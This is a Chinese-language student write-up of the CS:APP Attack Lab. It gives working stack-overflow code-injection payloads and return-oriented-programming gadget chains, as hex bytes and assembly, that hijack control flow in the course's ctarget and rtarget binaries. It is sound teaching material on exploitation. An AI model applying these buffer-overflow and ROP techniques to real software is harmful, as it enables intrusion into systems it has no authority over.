### Part I: Code Injection Attacks

##### Level 1

1. 程序 `ctarget` 执行后会进入 `test` 函数：

   <img src=".\assets\20210405_1.png" style="zoom: 80%;" />   

   其中，`getbuf` 函数有栈溢出漏洞（此处的 `Gets` 函数近似于 C 标准库中的 `gets` 函数）：

   <img src=".\assets\20210405_2.png" style="zoom:80%;" /> 

   

2. Level 1 要求让 `getbuf` 函数返回后程序流跳转到 `touch1` 函数，而不是继续执行 `test` 函数。

   <img src=".\assets\20210405_3.png" style="zoom:80%;" /> 

   用 `pwndbg` 查看 `touch1` 函数的首地址：`0x4017C0`。

   `pwndbg` 动态调试确定偏移：

   <img src=".\assets\20210405_4.png" style="zoom: 67%;" />  

   （将断点下在 `call Gets` 处：`0x4017AF`）

   <img src=".\assets\20210405_2.png" style="zoom:80%;" /> 

   可以看到，此时 `rdi` 相对于 `rsp` 的偏移是 0，而 `rdi` 便是 `Gets` 函数的第一个参数 `buf`。

    <img src=".\assets\20210405_6.png" style="zoom:67%;" />

   而且在 `call Gets` 后，`ret` 之前，会令 `rsp = rsp + 0x28` 。

   <img src=".\assets\20210405_7.png" style="zoom:67%;" /> 

   因此，要想让 `getbuf` 函数返回后直接跳转到 `touch1` ，我们可以在 `Get` 函数输入 `0x28` 个 `\x00` 后注入 `touch1` 函数的首地址 (`0x4017C0`) 即可。

   <img src=".\assets\20210405_8.png" style="zoom:67%;" /> 

   将 `s = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00` （注意：这里的 `0x004017c0` 要用小端序表示）**（马后炮：在 64 位系统中，最后注入的地址 `0x004017c0` 应该占 8 位，但这里只占了 4 位，之所以可以成功是因为后面的四位都是 `\x00`）**，复制到 `ctarget.txt`。然后，

   <img src=".\assets\20210405_9.png" style="zoom: 67%;" /> 

   OK!

   

##### Level 2

1. 要求从 `getbuf` 函数返回后程序流跳转到 `touch2` 函数，并且令输入参数 `val = cookie = 0x59b997fa `。

   

2. 对于 x86-64 架构来说，函数的第一个输入参数放置在寄存器 `rdi`，因此，在 `ret` 到 `touch2` 函数首地址之前，要令程序 `ret` 到这样的一段 gadget：它让 `rdi = cookie = 0x59b997fa `，将 `touch2` 函数首地址（`0x4017ec`） `push` 到栈顶，然后 `ret`。我们编写的 gadget 如下：

   ```assembly
   ; assem.s
   
   push $0x59b997fa
   pop %rdi
   push $0x4017ec
   ret
   ```

   反汇编成字节流：`68 fa 97 b9 59 5f 68 ec 17 40 00 c3`。

   ![](.\assets\20210406_1.png) 

   ```assembly
   assem.o:     file format elf64-x86-64
   
   
   Disassembly of section .text:
   
   0000000000000000 <.text>:
      0:   68 fa 97 b9 59          pushq  $0x59b997fa
      5:   5f                      pop    %rdi
      6:   68 ec 17 40 00          pushq  $0x4017ec
      b:   c3                      retq
   ```

   

3. 我们将 gadget 放置在 `buf` 的开头位置（`&buf = $rsp = 0x5561dc78`），填满 `0x28` 个 `padding`，在放置 `return address` 的位置存放 `buf` 的地址（`0x5561dc78`）**（马后炮：在 64 位系统中，注入的地址 `0x5561dc7` 应该占 8 位，但这里只占了 4 位，之所以可以成功是因为后面的四位都是 `\x00`）**，让程序流跳转到我们编写的 gadget。

   <img src=".\assets\20210405_6.png" style="zoom:67%;" /> 

   ![](.\assets\20210406_2.png) 

   ```
   ctarget.txt
   68 fa 97 b9 59 5f 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55
   ```

4. 结果

   ![](.\assets\20210406_3.png)



##### Level 3

1. 查看 `touch3` 函数的反汇编代码，确定其开始地址：`0x4018fa`。

   <img src=".\assets\20210407_2.png" style="zoom:67%;" /> 

   

2.  `59b997fa` （cookie）所对应的字符串的字节流表示：`35 39 62 39 39 37 66 61`

   

3. 具体思路：

   将字符串 "59b997fa" 的字节流填到存放 `return address` 的位置的后面（即 `buf + 0x28 + 0x8`，地址为 `0x5561dca8`，实验证明：如果将字符串放在 `buf` 头到存放 `return addr` 的位置中间的这一段会被覆盖）；在 `buf + 0x28` 处放置 `buf` 的地址：`0x5561dc78`（注意）；在 `buf + 0` 处放置如下的 gadget：

   ```assembly
   assm.o:     file format elf64-x86-64
   
   
   Disassembly of section .text:
   
   0000000000000000 <.text>:
      0:	68 a8 dc 61 55       	pushq  $0x5561dca8
      5:	5f                   	pop    %rdi
      6:	68 fa 18 40 00       	pushq  $0x4018fa	; touch3 函数的起始地址
      b:	c3                   	retq   
   ```

   最终的 payload 为：`68 a8 dc 61 55 5f 68 fa 18 40 00 c3 ` + ` 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00` + ` 78 dc 61 55 00 00 00 00` + `35 39 62 39 39 37 66 61`

   

4. 结果

   <img src=".\assets\20210407_3.png" style="zoom:67%;" /> 

   

5. 收获

   shell 输入/输出重定向：https://www.runoob.com/linux/linux-shell-io-redirections.html



### Part II: Return-Oriented Programming

##### Level 1

大意就是说：你可以使用程序 *rtarget* 中的函数 `start_farm` 和 `end_farm` 之间的 gadget 来构造攻击。

```assembly
; 用到的所有 gadget

1. 0x4019a2:	48 89 c7 c3			movq %rax, %rdi; retq;					
2. 0x401a06:	48 89 e0 c3			movq %rsp, %rax; retq;
3. 0x4019ab:	58 90 c3		 	popq %rax;	nop; retq;
4. 0x4019dd:	89 c2 90 c3			movl %eax, %edx; nop; retq;
5. 0x401a69:	89 d1 08 db c3		movl %edx, %ecx; orb %bl, %bl; retq;
6. 0x401a13:	89 ce 90 90 c3		movl %ecx, %esi; nop; nop; retq;
7. 0x00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```

（tips: 找 gadget 的时候，可以先从 `objdump` 中把可用的那段代码复制到一个 txt 文件中，在这个文件中查找比较方便。）



##### Level 2

1. 要求像 *Part I* 的 Level 2 那样，从 `getbuf` 函数返回到 `touch2` 并且使函数的第一个参数即 `rdi = cookie = 0x59b997fa  `。

2. gadget

   ```assembly
   0x4019a2:	48 89 c7 c3		movq %rax, %rdi; retq;
   0x4019ab:	58 90 c3		 popq %rax;	nop; retq;
   ```

   

3. 关键函数

   ![](.\assets\20210408_1.png)

   

4. 思路

   先用 `popq %rax;	nop; retq;` 将 `rax` 赋值为 `0x59b997fa` ；再用 `movq %rax, %rdi; retq;` 把 `rax` 的值赋给 `rdi`，然后再去调用 `touch2` 函数

   

5. payload

   `00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00` `ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00` `a2 19 40 00 00 00 00 00` `ec 17 40 00 00 00 00 00`

   

6. 结果

   <img src=".\assets\20210408_2.png" style="zoom: 80%;" /> 

   

##### Level 3

1. 基本思路：将  `35 39 62 39 39 37 66 61`  写到栈上的某个位置（很可能是放在 payload 的最后） -> 想办法将这个地址送到 `rdi` -> `call touch3`

   

2. gadget

   ```assembly
   1. 0x4019a2:	48 89 c7 c3			movq %rax, %rdi; retq;					
   2. 0x401a06:	48 89 e0 c3			movq %rsp, %rax; retq;
   3. 0x4019ab:	58 90 c3		 	popq %rax;	nop; retq;
   4. 0x4019dd:	89 c2 90 c3			movl %eax, %edx; nop; retq;
   5. 0x401a69:	89 d1 08 db c3		movl %edx, %ecx; orb %bl, %bl; retq;
   6. 0x401a13:	89 ce 90 90 c3		movl %ecx, %esi; nop; nop; retq;
   7. 0x00000000004019d6 <add_xy>:
     4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
     4019da:	c3                   	retq   
   ```

   用 gadget 3 可以给 `rax` 赋任意值；用 gadget 2 可以将 `rsp` 的值赋给 `rax`；用 gadget 4~6 可以将 `eax` 赋给 `esi`（注意：`movl %eax, %ebx` 会将 `eax` 赋给 `rbx` 的低 4 位，并且将 `rbx` 的高 4 位清零）；用 gadget 1 可以将 `rax` 赋给 `rdi`。

   至此，我们可以将栈上某个位置的 `rsp` 的值（记好这个位置）赋给 `rdi`，然后计算我们放置字符串的位置相对于这个位置的偏移，将这个偏移值赋给 `esi` （利用 gadget 3~6 实现对 `esi` 的任意赋值），再用 gadget 7 将 `[rdi + rsi]` 赋给 `rax`，用 gadget 1 将 `rax` 赋给 `rdi`，最后再 return 到函数 `touch3` 即可。

   其中，`lea (%rdi,%rsi,1),%rax` 在 intel 语法下是 `lea rax,[rdi + 1*rsi]`

   

3. 栈图

   ![](.\assets\栈图.png)

   

4. payload

   `00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00` + `06 1a 40 00 00 00 00 00` + `a2 19 40 00 00 00 00 00` + `ab 19 40 00 00 00 00 00` + `48 00 00 00 00 00 00 00` + `dd 19 40 00 00 00 00 00` + `69 1a 40 00 00 00 00 00` + `13 1a 40 00 00 00 00 00` + `d6 19 40 00 00 00 00 00` + `a2 19 40 00 00 00 00 00` + `fa 18 40 00 00 00 00 00` + `35 39 62 39 39 37 66 61`

   

5. 结果

   ![](.\assets\20210409_1.png)



